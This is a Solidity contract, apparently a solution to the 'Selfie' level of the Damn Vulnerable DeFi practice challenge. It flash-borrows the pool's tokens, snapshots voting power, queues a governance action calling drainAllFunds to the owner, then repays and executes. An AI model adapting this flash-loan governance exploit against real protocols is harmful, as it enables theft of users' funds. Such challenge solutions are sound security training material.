// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '../DamnValuableTokenSnapshot.sol';
import './SelfiePool.sol';
import './SimpleGovernance.sol';

/**
 * @title SelfieAttacker
 * @author jb
 */
contract SelfieAttacker {
    address private _owner;
    SelfiePool private _pool;
    SimpleGovernance private _governance;
    DamnValuableTokenSnapshot private _token;

    constructor() {
        _owner = msg.sender;
    }

    // sets up attack by queuing exploit vote
    function attack(
        SelfiePool pool,
        SimpleGovernance governance,
        DamnValuableTokenSnapshot token
    ) external {
        _attack(pool, governance, token);
    }

    // finish the attack by executing after the governance action delay has passed
    function finish(SimpleGovernance target, uint256 actionId) external {
        target.executeAction(actionId);
    }

    function _attack(
        SelfiePool pool,
        SimpleGovernance governance,
        DamnValuableTokenSnapshot token
    ) internal {
        _pool = pool;
        _governance = governance;
        _token = token;

        uint256 tokenAmount = _token.balanceOf(address(pool));
        _pool.flashLoan(tokenAmount);

        _pool = SelfiePool(address(0));
        _governance = SimpleGovernance(address(0));
        _token = DamnValuableTokenSnapshot(address(0));
    }

    // receive the flash loan and perform the governance exploit
    function receiveTokens(address token, uint256 amount) external {
        require(token == address(_token), 'wrong token!');
        _token.snapshot();
        _governance.queueAction(
            address(_pool),
            abi.encodeWithSignature('drainAllFunds(address)', _owner),
            0
        );
        _token.transfer(address(_pool), amount);
    }

    receive() external payable {}
}
